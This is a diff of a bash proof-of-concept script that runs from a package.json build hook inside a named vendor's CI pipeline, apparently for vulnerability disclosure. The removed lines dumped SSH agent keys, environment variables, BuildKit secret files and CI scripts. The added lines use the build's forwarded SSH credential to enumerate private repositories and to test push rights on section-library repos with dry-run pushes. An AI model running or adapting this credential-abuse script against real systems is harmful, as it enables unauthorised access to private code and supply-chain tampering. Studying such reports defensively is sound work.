@@ -1,47 +1,36 @@
 #!/usr/bin/env bash
-# Yext Sites section-library CI - credential exposure PoC collector
-# Read-only. Writes nothing, deletes nothing, modifies no Yext state.
-# Runs from package.json "build", i.e. inside:
-#   [stage-1 16/18] RUN --mount=type=ssh,id=deps_key,uid=2500 /scripts/user_commands/build.sh
-# All output lands in the revision build log, retrievable by the library owner via
-#   yext.publish.sectionlibraries.v1.SectionLibraryApi/GetSectionLibraryRevisionBuildLogs
+# Yext CI credential IMPACT demonstration. Non-destructive:
+#  - ls-remote  = read probe, returns ref names only, no source cloned
+#  - push --dry-run = write-permission probe; GitHub authorizes git-receive-pack before any
+#    object transfer, so this reveals permission WITHOUT creating or changing any ref
 set +e
 B="YEXTPOC7731"
 echo "$B-BEGIN"
 
-echo "$B === 1. IDENTITY (expect uid 2500 yextci) ==="
-whoami 2>&1; id 2>&1; hostname 2>&1; pwd 2>&1
-
-echo "$B === 2. SSH AGENT: is deps_key reachable from repo-controlled build code? ==="
-echo "SSH_AUTH_SOCK=$SSH_AUTH_SOCK"
-ls -la "$SSH_AUTH_SOCK" 2>&1
-echo "--- ssh-add -l (fingerprints + key comments) ---"
+echo "$B === IDENTITY ==="
+id 2>&1
+ssh -o StrictHostKeyChecking=no -o BatchMode=yes -o ConnectTimeout=15 -T git@github.com 2>&1
 ssh-add -l 2>&1
-echo "--- ssh-add -L (public keys in agent; an agent never exports private keys) ---"
-ssh-add -L 2>&1
 
-echo "$B === 3. WHOSE IDENTITY DOES THE AGENT AUTHENTICATE AS? ==="
-ssh -o StrictHostKeyChecking=no -o BatchMode=yes -o ConnectTimeout=15 \
-    -T git@github.com 2>&1
-echo "--- git op over the agent, against a PUBLIC repo only ---"
-git ls-remote git@github.com:yext-section-libraries/standard-library.git 2>&1 | head -3
+echo "$B === READ PROBE: private Yext repos (refs only, nothing cloned) ==="
+for R in yext/yext yext/sites yext/pages yext/visual-editor yext/yextve \
+         yext/pages-visual-editor-starter yext/sites-starter yext/deps; do
+  printf '%-42s ' "$R"
+  OUT=$(GIT_SSH_COMMAND='ssh -o StrictHostKeyChecking=no -o BatchMode=yes -o ConnectTimeout=15' \
+        git ls-remote "git@github.com:$R.git" 2>&1 | head -2 | tr '\n' ' ')
+  echo "$OUT"
+done
 
-echo "$B === 4. BUILDKIT SECRET MOUNTS (paths taken from the disclosed RUN bodies) ==="
-ls -la /run/secrets/ 2>&1
-echo "--- semgrep_app_token (mounted in the semgrep-scan stage; expected absent here) ---"
-cat /run/secrets/semgrep_app_token 2>&1
-
-echo "$B === 5. ENVIRONMENT ==="
-printenv 2>&1 | sort
-
-echo "$B === 6. CI WRAPPER SCRIPTS (the pipeline the build logs reference) ==="
-ls -la /scripts /scripts/bin /scripts/user_commands 2>&1
-echo "--- /scripts/user_commands/build.sh ---"
-cat /scripts/user_commands/build.sh 2>&1
-echo "--- /scripts/mark-builderror.sh ---"
-cat /scripts/mark-builderror.sh 2>&1
-echo "--- /scripts/user_commands/install_deps.sh ---"
-cat /scripts/user_commands/install_deps.sh 2>&1
+echo "$B === WRITE PROBE: section-library supply chain (DRY RUN, nothing is written) ==="
+export GIT_SSH_COMMAND='ssh -o StrictHostKeyChecking=no -o BatchMode=yes -o ConnectTimeout=15'
+for R in yext-section-libraries/standard-library yext-section-libraries/bar-social-dining; do
+  echo "--- $R ---"
+  rm -rf /tmp/wt && git clone -q --depth 1 "git@github.com:$R.git" /tmp/wt 2>&1 | head -2
+  if [ -d /tmp/wt ]; then
+    ( cd /tmp/wt && git push --dry-run origin HEAD:refs/heads/poc7731-writetest 2>&1 | head -6 )
+  fi
+  rm -rf /tmp/wt
+done
 
 echo "$B-END"
 exit 0
